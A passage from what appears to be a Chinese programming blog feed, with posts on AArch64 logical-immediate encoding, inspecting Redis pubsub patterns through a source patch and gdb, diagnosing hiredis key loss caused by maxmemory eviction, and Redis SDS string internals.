<li><p>首先，一定能找到一个长度为n的二进制模式串s（n要求必须是2 , 4,  8, 16, 32, 64 中的一个）。</p>
</li>
<li><p>且模式串s必须由 m个连续的1组成的二进制串(这个串长度也是n，m要求必须在[1, n - 1]之间) 通过循环右移任意次数得到。</p>
</li>
<li><p>最后将这个n位的模式串s拼接 64 &#x2F; n 次，得到1个64位的二进制串，它的值等于a。</p>
</li>
</ul>
<p><strong>N, imms, immr字段的作用：</strong></p>
<p><code>N</code> 和 <code>imms</code>共同决定<strong>二进制模式串s的长度</strong>，以及<strong>模式串s有几个连续的1</strong>。</p>
<p><code>immr</code>： r即rotate，表示模式串s的循环右移次数，范围 0 ~ 63。</p>
<p>N和imms的取值组合参考下表：</p>
<table>
<thead>
<tr>
<th>N</th>
<th>imms</th>
<th></th>
<th></th>
<th></th>
<th></th>
<th></th>
<th>模式串长度</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>x</td>
<td>2 位</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>x</td>
<td>x</td>
<td>4 位</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>8 位</td>
</tr>
<tr>
<td>0</td>
<td>1</td>
<td>0</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>16 位</td>
</tr>
<tr>
<td>0</td>
<td>0</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>32 位</td>
</tr>
<tr>
<td>1</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>x</td>
<td>64 位</td>
</tr>
</tbody></table>
<p>对于给定的<code>N</code>和<code>imms</code>，<strong>x可以取0或1，但不允许所有的x同时取1</strong>，因此对于n位的模式串，x的取值组合有 n - 1种情况。</p>
<p>以下举几个例子帮助理解：</p>
<ul>
<li><p><code>N</code> &#x3D; 0 <code>imms</code> &#x3D; <strong>1 1 1 0</strong> <font color="red"><strong>1 0</strong></font>， 表示模式串长度为4，且模式串中连续1的个数为 10 ‘b + 1 &#x3D; 3，即 0111。此时<code>immr</code>的范围[0, 3]</p>
<ul>
<li><code>immr</code> &#x3D; 0， 表示立即数为 0111 0111 0111 0111  0111 0111 0111 0111  0111 0111 0111 0111  0111 0111 0111 0111 &#x3D; 0x7777777777777777</li>
<li><code>immr</code> &#x3D; 2, 表示模式串循坏右移2次 （0111 -&gt; 1101)，立即数为 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 1101 &#x3D; 0xdddddddddddd</li>
</ul>
</li>
<li><p><code>N</code> &#x3D; 0 <code>imms</code> &#x3D; <strong>1 1 1 1 0</strong> <font color="red"><strong>0</strong></font>，表示模式串长度为2，且模式串中连续1的个数为 0 ‘b + 1 &#x3D; 1，即 01。此时<code>immr</code>的范围[0, 1]</p>
<ul>
<li><code>immr</code> &#x3D; 0，表示立即数 01 01 …… 01 b(连续32个01组成)，即 0x5555555555555555</li>
<li><code>immr</code> &#x3D; 1，表示模式串循坏右移1次（01 -&gt; 10），立即数 10 10 ……  10 b(连续32个10组成)，即 0xaaaaaaaaaaaaaaaa</li>
</ul>
</li>
</ul>
<p>可以看出：</p>
<ul>
<li><p>对于长度为n位的模式串，连续1的个数可以是[1, n - 1]，又因为s位模式串循环右移任意次数是[0, n -1]，所以一共拼接出 n * (n - 1)个不同的立即数。</p>
</li>
<li><p>长度n的取值由N和imms共同决定，取值范围 {2, 4, 8, 16, 32, 64}</p>
</li>
</ul>
<p>综上， AND指令支持的立即数总数为 2 * 1 + 4 * 3 + 8 * 7 + …… + 64 * 63 &#x3D; 5334。</p>
<p>可以手撕代码，打印出这5334个符合条件的立即数，参考：<a href="https://dinfuehr.github.io/blog/encoding-of-immediate-values-on-aarch64/">https://dinfuehr.github.io/blog/encoding-of-immediate-values-on-aarch64/</a></p>
<p>回到问题， 0xfef的二进制串为1111 1110 1111，你会发现 <font color="red"><strong>N, imms, immr不管取什么值，都无法得到1111 1110 1111这个串，所以AND指令的编译会报错</strong></font>。</p>
<h2><span id="参考资料">参考资料</span></h2><p>【1】<a href="https://developer.arm.com/documentation/ddi0487/latest/arm-architecture-reference-manual-armv8-for-armv8-a-architecture-profile">《ARM Architecture Reference Manual, for ARMv8-A architecture profile》</a></p>
<p>【2】  <a href="https://dinfuehr.github.io/blog/encoding-of-immediate-values-on-aarch64/">ENCODING OF IMMEDIATE VALUES ON AARCH64</a></p>
]]></content>
      <categories>
        <category>Assembly</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>Assembly</tag>
      </tags>
  </entry>
  <entry>
    <title>如何查看Redis订阅的模式字符串</title>
    <url>/2021/1121201745.html</url>
    <content><![CDATA[<h2><span id="问题描述">问题描述</span></h2><p><code>pubsub channels</code>可以查看Redis中被订阅的频道(<strong>channel</strong>)：</p>
<span id="more"></span>
<p><img data-src="/2021/1121201745/image1.png"></p>
<p><code>pubsub numpat</code>可以查看被订阅的模式(<strong>pattern</strong>)数量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># redis-cli pubsub numpat</span><br><span class="line">(integer) 3</span><br></pre></td></tr></table></figure>

<p><strong>问题：</strong></p>
<p>除了查看被订阅模式的数量，我还需要<font color="red"><strong>获取每个订阅模式字符串的内容</strong></font>，怎么做 ?</p>
<h2><span id="解决方法">解决方法</span></h2><p>google没搜到现成的命令，决定自己修改<code>redis-server</code>源码，打印模式链表的内容，用时3~5分钟，需要了解：</p>
<ul>
<li><p>Redis源码编译方法，参考<a href="https://github.com/redis/redis">官网</a>或本人的<a href="https://blog.csdn.net/pcj_888/article/details/106483567">博客</a></p>
</li>
<li><p>Redis服务器将所有模式的订阅信息保存在服务器状态的<code>pubsub_patterns</code>链表中。</p>
</li>
</ul>
<h4><span id="具体操作">具体操作</span></h4><p>1、下载Redis源码（这里用的是6.0.9版本的源码，<a href="https://github.com/redis/redis/releases/tag/6.0.9">下载链接</a>），修改<code>pubsub.c</code>，自定义一个模式链表打印函数<code>myPubsubPatternsPrint</code>，实现参考如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// pubsub.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">myPubsubPatternsPrint</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">list</span> *l = server.pubsub_patterns;</span><br><span class="line">    listNode *cur = l-&gt;head;</span><br><span class="line">    serverLog(LL_NOTICE, <span class="string">&quot;[DEBUG] ALL PUBSUB PATTERNS: &quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        pubsubPattern *pp = (pubsubPattern *)(cur-&gt;value);</span><br><span class="line">        robj *obj = pp-&gt;pattern;</span><br><span class="line">        <span class="type">char</span> *pattern = (<span class="type">char</span> *)obj-&gt;ptr;</span><br><span class="line">        serverLog(LL_NOTICE, <span class="string">&quot;%s&quot;</span>, pattern);</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、重新编译并安装redis-server，后台gdb call一下自定义的打印函数<code>myPubsubPatternsPrint</code>得到模式链表的内容，如下图所示：<br><img data-src="/2021/1121201745/image2.png"></p>
<h2><span id="参考资料">参考资料</span></h2><p>【1】《Redis设计与实现》 第18章 发布与订阅</p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Hiredis查询失败时出现key丢失问题定位</title>
    <url>/2021/1130202525.html</url>
    <content><![CDATA[<h3><span id="问题描述">问题描述</span></h3><p>hiredis查询key失败后，出现key丢失的问题。</p>
<p>REDIS版本及源码：<a href="https://github.com/redis/redis/releases/tag/6.0.10">6.0.10</a></p>
<p>hiredis版本及源码：<a href="https://github.com/redis/hiredis/releases/tag/v1.0.2">v1.0.2</a></p>
<span id="more"></span>

<p><strong>案例描述：</strong></p>
<p>REDIS中预先写入1个字符串键”hello”，客户端代码基于hiredis，创建100个读线程和100个写线程，每个线程里发起一次短连接读写key，代码参考：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;hiredis/hiredis.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERV_IP <span class="string">&quot;127.0.0.1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SERV_PORT 6379</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_READER 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NUM_WRITER 100</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">int</span> OK = <span class="number">0</span>;</span><br><span class="line"><span class="type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">DBGetString</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *key, <span class="type">char</span> *value)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">    tv.tv_sec = <span class="number">5</span>; tv.tv_usec = <span class="number">0</span>;</span><br><span class="line">    redisContext *c = redisConnectWithTimeout(SERV_IP, SERV_PORT, tv);</span><br><span class="line">    assert(c != <span class="literal">NULL</span> &amp;&amp; !c-&gt;err);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cmd[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(cmd, <span class="string">&quot;GET %s&quot;</span>, key);</span><br><span class="line">    redisReply *reply = (redisReply *)redisCommand(c, cmd);</span><br><span class="line">    assert(reply-&gt;str != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(value, reply-&gt;str);</span><br><span class="line">    freeReplyObject(reply);</span><br><span class="line">    redisFree(c);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">DBSetString</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *key, <span class="type">const</span> <span class="type">char</span> *value)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">tv</span>;</span></span><br><span class="line">    tv.tv_sec = <span class="number">5</span>; tv.tv_usec = <span class="number">0</span>;</span><br><span class="line">    redisContext *c = redisConnectWithTimeout(SERV_IP, SERV_PORT, tv);</span><br><span class="line">    assert(c != <span class="literal">NULL</span> &amp;&amp; !c-&gt;err);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> cmd[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">sprintf</span>(cmd, <span class="string">&quot;SET %s %s&quot;</span>, key, value);</span><br><span class="line">    redisReply *reply = (redisReply *)redisCommand(c, cmd);</span><br><span class="line">    freeReplyObject(reply);</span><br><span class="line">    redisFree(c);</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">Reader</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    DBGetString(<span class="string">&quot;hello&quot;</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *<span class="title function_">Writer</span><span class="params">(<span class="type">void</span> *args)</span> &#123;</span><br><span class="line">    DBSetString(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">testcase</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">time_t</span> t1 = time(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="type">pthread_t</span> wid[NUM_WRITER];</span><br><span class="line">    <span class="type">pthread_t</span> rid[NUM_READER];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_WRITER; ++i) &#123;</span><br><span class="line">        pthread_create(&amp;wid[i], <span class="literal">NULL</span>, Writer, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_READER; ++i) &#123;</span><br><span class="line">        pthread_create(&amp;rid[i], <span class="literal">NULL</span>, Reader, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_WRITER; ++i) &#123;</span><br><span class="line">        pthread_join(wid[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; NUM_READER; ++i) &#123;</span><br><span class="line">        pthread_join(rid[i], <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">time_t</span> t2 = time(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%ld s\n&quot;</span>, t2 - t1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    testcase();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3><span id="定位思路">定位思路</span></h3><p>Redis key丢失一般有如下原因：</p>
<ul>
<li>key被客户端删除。</li>
<li>key是过期键，到期自动删除。</li>
<li>因为内存不足导致key被逐出。</li>
</ul>
<p>本案例中的客户端只有get,set，没有删除操作，未设置键的过期时间，且机器内存也足够（4G以上）。初步分析不出原因，只能结合REDIS源码正向定位，于是有了第二种思路：</p>
<p><em><strong>REDIS是基于内存的数据库，字符串键肯定在REDIS-SERVER进程中的某个内存地址处，key丢失时这个地址的内容肯定被改写，这时只需要GDB打个数据断点，看下调用栈即可分析原因。</strong></em></p>
<p>以下给出详细的定位过程。</p>
<h3><span id="定位过程">定位过程</span></h3><p>1、使用GCC的-g -O0编译选项，重新编译redis-server, hiredis源代码。（这一步非必要，目的是更方便调试）</p>
<p>2、GDB打数据断点<br><img data-src="/2021/1130202525/image1.png"></p>
<p>3、断点触发，观察调用栈<br><img data-src="/2021/1130202525/image2.png"></p>
<p>观察第5帧，<code>freeMemoryIfNeeded</code>，说明触发了REDIS的内存淘汰机制，GDB打印出的REDIS配置项<code>maxmemory</code>仅为1048576字节(表示内存大小为1M)，且内存淘汰机制为<code>allkeys-lru</code>，这个机制会导致key被回收。</p>
<h3><span id="解决方法">解决方法</span></h3><p>修改redis配置项maxmemory，内存给多点。（这里给1073741824，表示1G内存）</p>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(一)——简单动态字符串</title>
    <url>/2021/1211202806.html</url>
    <content><![CDATA[<h2><span id="前言">前言</span></h2><p>Redis是用C语言开发的，但并没有直接使用C语言数组去表示字符串，而是使用简单动态字符串(Simple dynamic String，简称SDS)作为字符串的底层实现。</p>
<p>以下给出SDS相关的一些常见问题，通过源码分析和实际验证，思考这些问题的答案，了解实现原理和设计思路。</p>
<span id="more"></span>

<p><strong>源码版本：</strong></p>
<p><a href="https://github.com/redis/redis/releases/tag/3.0.0">Redis 3.0.0</a></p>
<p><a href="https://github.com/redis/redis/releases/tag/6.0.10">Redis 6.0.10</a></p>
<h2><span id="思考问题">思考问题<span id="jump0"></span></span></h2><ul>
<li><a href="#jump1">SDS的数据结构，字符串如何表示的</a><ul>
<li><a href="#jump2">SDS结构体各成员的作用</a></li>
<li><a href="#jump3">创建给定C字符串的SDS场景，sdshdr结构体各成员初值是多少</a></li>
</ul>
</li>
<li><a href="#jump4">SDS相较于C风格字符串的优点</a><ul>
<li><a href="#jump5">SDS的空间分配策略是如何杜绝缓冲区溢出问题的</a></li>
<li><a href="#jump6">SDS是如何减少修改字符串时带来的内存重分配次数</a><ul>
<li><a href="#jump7">字符串增长场景，SDS扩容策略</a></li>
<li><a href="#jump8">字符串缩短场景，SDS空间释放策略</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#jump9">SDS最大长度是多少</a></li>
<li><a href="#jump10">字符串键的三种编码方式</a><ul>
<li><a href="#jump11">int编码</a></li>
<li><a href="#jump12">embstr编码</a></li>
<li><a href="#jump13">raw编码</a></li>
<li><a href="#jump14">设计embstr编码的用意是什么</a></li>
<li><a href="#jump15">三种编码之间的转换规则</a></li>
</ul>
</li>
<li><a href="#jump16">对于很短的字符串，并不需要4字节表示长度，REDIS 3.2中的SDS实现是如何优化，节约内存的</a><ul>
<li><a href="#jump17">给定一个长度为n的sds，它的底层通过哪个sdshdr类型表示？</a></li>
</ul>
</li>
<li><a href="#jump18">REDIS字符串命令</a></li>
</ul>
<h2><span id="源码分析">源码分析</span></h2><h3><span id="sds的数据结构字符串是如何表示的">SDS的数据结构，字符串是如何表示的 <span id="jump1"></span></span></h3><p>REDIS 3.0中，SDS的数据结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> &#123;</span></span><br><span class="line">	<span class="type">int</span> len;		<span class="comment">// 字符串长度，即对C风格字符串调用strlen的结果</span></span><br><span class="line">	<span class="type">int</span> <span class="built_in">free</span>;		<span class="comment">// buf数组中的未使用字节数</span></span><br><span class="line">	<span class="type">char</span> buf[];		<span class="comment">// &#x27;\0&#x27;结尾</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>注意sizeof(struct sdshdr)的结果等于8，不是9；这里的buf为柔性数组成员。至于为什么用柔性数组成员可以参考这篇文章：<a href="https://www.cnblogs.com/davygeek/p/5748852.html">https://www.cnblogs.com/davygeek/p/5748852.html</a></p>
<h4><span id="sds结构体各成员的作用">SDS结构体各成员的作用<span id="jump2"></span></span></h4><ul>
<li>len: 表示buf数组中已使用的字节数(<strong>不包括’\0’</strong>)，即字符串长度。好处是获取字符串长度时间为O(1)</li>
<li>free: 表示buf数组中未使用的字节数。</li>
<li>buf: 用于保存字符串，遵循C风格字符串原则，以’\0’结尾。</li>
</ul>
<h4><span id="创建给定c字符串的sds场景sdshdr结构体各成员初值是多少">创建给定C字符串的SDS场景，sdshdr结构体各成员初值是多少？<span id="jump3"></span></span></h4><p><strong>思考问题</strong>：写入一个字符串键key, 值为长度为5的字符串”Redis”，它的SDS表示中len, free, buf成员值各是多少？</p>
<p><strong>源码分析：</strong></p>
<p>1、Redis调用<code>sdsnew</code>创建一个包含给定C字符串的SDS，这里的initlen &#x3D; strlen(“Redis”) &#x3D; 5。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sds <span class="title function_">sdsnew</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *init)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> initlen = (init == <span class="literal">NULL</span>) ? <span class="number">0</span> : <span class="built_in">strlen</span>(init);	<span class="comment">// 调用strlen获取长度</span></span><br><span class="line">    <span class="keyword">return</span> sdsnewlen(init, initlen);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、再调用<code>sdsnewlen</code>，返回SDS。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sds <span class="title function_">sdsnewlen</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *init, <span class="type">size_t</span> initlen)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> *<span class="title">sh</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// sds遵循C风格字符串原则，以&#x27;\0&#x27;结尾，额外1字节不计数len</span></span><br><span class="line">    <span class="keyword">if</span> (init) &#123;</span><br><span class="line">        sh = zmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)+initlen+<span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        sh = zcalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)+initlen+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sh == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    sh-&gt;len = initlen;			<span class="comment">// len = strlen(init)</span></span><br><span class="line">    sh-&gt;<span class="built_in">free</span> = <span class="number">0</span>;				<span class="comment">// 创建一个包含C字符串SDS场景，free = 0</span></span><br><span class="line">    <span class="keyword">if</span> (initlen &amp;&amp; init)</span><br><span class="line">        <span class="built_in">memcpy</span>(sh-&gt;buf, init, initlen);</span><br><span class="line">    sh-&gt;buf[initlen] = <span class="string">&#x27;\0&#x27;</span>;	<span class="comment">// sds遵循C风格字符串原则，以&#x27;\0&#x27;结尾，额外1字节不计入len</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">char</span>*)sh-&gt;buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，创建给定C字符串的SDS场景：</p>
<ul>
<li><p>len的值为strlen(“Redis”) &#x3D; 5</p>
</li>
<li><p>free的值为0</p>
</li>
<li><p>buf的内容为 “Redis”, 以’\0’结尾，6字节大小</p>
</li>
</ul>
<p>SDS实例图：<br><img data-src="/2021/1211202806/image1.png"></p>
<p><strong>思考问题：</strong> 初始化SDS时free为啥给0？—— 平时使用字符串还是只读场景偏多，这样能节约空间。</p>
<p><strong>GDB验证：</strong></p>
<p>Redis是基于内存的数据库，可以通过GDB打印内存，查看这个key对应的SDS结构体，是否和源码分析结果一致：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) p server.db[0].dict.ht[0]</span><br><span class="line">$1 = &#123;table = 0x7f3008d40900, size = 4, sizemask = 3, used = 1&#125;</span><br><span class="line"></span><br><span class="line">(gdb) p *(struct redisObject *) (server.db[0].dict.ht[0].table[0].v)</span><br><span class="line">$2 = &#123;type = 0, encoding = 8, lru = 11494144, refcount = 1, ptr = 0x7f3008d40838&#125;</span><br><span class="line"># type = REDIS_STRING(0), encoding = REDIS_ENCODING_EMBSTR(8)</span><br><span class="line"></span><br><span class="line">(gdb) p  (*(robj *)server.db[0].dict.ht[0].table[0].v).ptr</span><br><span class="line">$3 = (void *) 0x7f3008d40838</span><br><span class="line"></span><br><span class="line">(gdb) p  (sds) 0x7f3008d40838</span><br><span class="line">$4 = (sds) 0x7f3008d40838 &quot;redis&quot;		# 存储字符串键的值</span><br><span class="line"></span><br><span class="line">(gdb) p *(struct sdshdr *)(0x7f3008d40838 - 0x8)			# len 4字节， free 4字节，减去8字节正好是struct sdshdr的首地址</span><br><span class="line">$5 = &#123;len = 5, free = 0, buf = 0x7f3008d40838 &quot;Redis&quot;&#125;  	# 和以上源码分析的SDS结构体内容一致</span><br></pre></td></tr></table></figure>

<p><strong>上述GDB调试操作的依据说明：</strong></p>
<ul>
<li><p>Redis将所有数据库保存在服务器状态<code>server</code>变量中，默认创建16个数据库，默认目标数据库为0号(db[0])</p>
</li>
<li><p>dict为数据库键空间，保存所有键值对，底层实现为哈希表，其中ht[0]存储key-value，ht[1]用于rehash</p>
</li>
<li><p>table类型为<code>dictEntry **</code>, 链地址法实现哈希表，table[0]不为NULL，说明这个key的hashcode % size的结果为0</p>
</li>
<li><p>ptr类型为void *。对于字符串键而言，ptr实际类型为char *，存储内容为”Redis”串，而不是struct sdshdr的首地址。</p>
</li>
</ul>
<p><strong>注：</strong>Redis并没有直接使用sds, list这些基本数据结构去实现数据库，而是在这些基本数据结构上构筑了一个<strong>对象系统</strong>，统一使用redisObject对象：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">redisObject</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> type:<span class="number">4</span>;			    <span class="comment">// 类型</span></span><br><span class="line">    <span class="type">unsigned</span> encoding:<span class="number">4</span>;			<span class="comment">// 编码</span></span><br><span class="line">    <span class="type">unsigned</span> lru:<span class="number">24</span>;				<span class="comment">// 记录对象最后一次被命令程序访问的时间</span></span><br><span class="line">    <span class="type">int</span> refcount;					<span class="comment">// 引用计数</span></span><br><span class="line">    <span class="type">void</span> *ptr;						<span class="comment">// 指向底层实现数据结构的指针</span></span><br><span class="line">&#125; robj;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>ptr为void *泛型指针，指向底层实现的数据结构。void *是C语言实现泛型编程的常用手段。</p>
</li>
<li><p>type为对象类型。type属性设计目的很简单，因为仅通过ptr这个泛型指针无法获取这个对象真正的类型。对于字符串键，type值取0（REDIS_STRING）</p>
</li>
<li><p>encoding为编码类型。encoding属性设计目的在于，根据不同场景，为对象设置不同的底层数据结构实现来优化性能。此例中，encoding值取8(REDIS_ENCODING_EMBSTR)，表示编码方式为embstr。</p>
</li>
</ul>
<h3><span id="sds相较于c风格字符串的优点">SDS相较于C风格字符串的优点<span id="jump4"></span></span></h3><ul>
<li><p>获取字符串长度的时间复杂度为O(1) （对于SDS来说，获取长度只需访问len成员）</p>
</li>
<li><p>杜绝缓冲区溢出问题</p>
</li>
<li><p>减少字符串修改时导致的内存重分配次数</p>
</li>
<li><p>二进制安全，除了能保存文本数据，还可以保存二进制数据</p>
</li>
</ul>
<h4><span id="sds的空间分配策略是如何杜绝缓冲区溢出问题的">SDS的空间分配策略是如何杜绝缓冲区溢出问题的？<span id="jump5"></span></span></h4><p>以SDS拼接函数<code>sdscat</code>为例，源码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sds <span class="title function_">sdscat</span><span class="params">(sds s, <span class="type">const</span> <span class="type">char</span> *t)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> sdscatlen(s, t, <span class="built_in">strlen</span>(t));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sds <span class="title function_">sdscatlen</span><span class="params">(sds s, <span class="type">const</span> <span class="type">void</span> *t, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sdshdr</span> *<span class="title">sh</span>;</span></span><br><span class="line">    <span class="type">size_t</span> curlen = sdslen(s);		<span class="comment">// 得到源字符串长度</span></span><br><span class="line"></span><br><span class="line">    s = sdsMakeRoomFor(s,len);		<span class="comment">// 拼接前检查s的剩余空间是否足够，如空间不足需先扩展空间</span></span><br><span class="line">    <span class="keyword">if</span> (s == <span class="literal">NULL</span>) <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    sh = (<span class="type">void</span>*) (s-(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sdshdr)));</span><br><span class="line">    <span class="built_in">memcpy</span>(s+curlen, t, len);</span><br><span class="line">    sh-&gt;len = curlen+len;</span><br><span class="line">    sh-&gt;<span class="built_in">free</span> = sh-&gt;<span class="built_in">free</span>-len;</span><br><span class="line">    s[curlen+len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，<code>sdscat</code>拼接字符串前，会先通过<code>sdsMakeRoomFor</code>检查s的剩余空间是否足够，<strong>如果空间不足，会先调用<code>realloc</code>扩展出足够空间后</strong>，再通过<code>memcpy</code>拼接字符串。 所以杜绝了缓冲区溢出问题。</p>
<h4><span id="sds是如何减少修改字符串时带来的内存重分配次数">SDS是如何减少修改字符串时带来的内存重分配次数<span id="jump6"></span></span></h4><p>对于C字符串，每次增长或缩短操作，都会导致一次内存重分配，性能较差。</p>
<p>SDS中引入free属性，通过未使用空间，优化字符串的增长或缩短操作，减少内存重分配次数。</p>
<h4><span id="字符串增长场景sds扩容策略">字符串增长场景，SDS扩容策略<span id="jump7"></span></span></h4><p>对于字符串增长场景，REDIS采用空间预分配的思想，即不仅分配修改后的SDS必需的空间，<strong>还会额外分配一定的未使用空间</strong>。源码参考<code>sdsMakeRoomFor</code></p>
